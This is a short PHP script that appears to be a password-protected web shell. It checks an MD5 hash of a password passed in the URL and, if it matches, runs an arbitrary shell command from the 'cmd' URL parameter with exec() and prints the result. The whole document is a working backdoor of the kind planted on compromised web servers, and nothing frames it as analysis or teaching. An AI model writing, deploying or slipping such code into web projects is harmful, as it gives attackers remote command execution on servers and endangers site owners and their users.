define('PASSWORD', 'f8b60df48fae35dfa126a1b6ccc3ceed');

function auth($password)
{
	$input_password_hash = md5($password);

	if (strcmp(PASSWORD, $input_password_hash) == 0) {
		return TRUE;
	}else{
		return FALSE;
	}
}


if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
	
	if (auth($_GET['password'])) {
			echo '<pre>'. exec($_GET['cmd']) .'<pre>';
	}else{
		die('Access denide!');
	}
}

?>
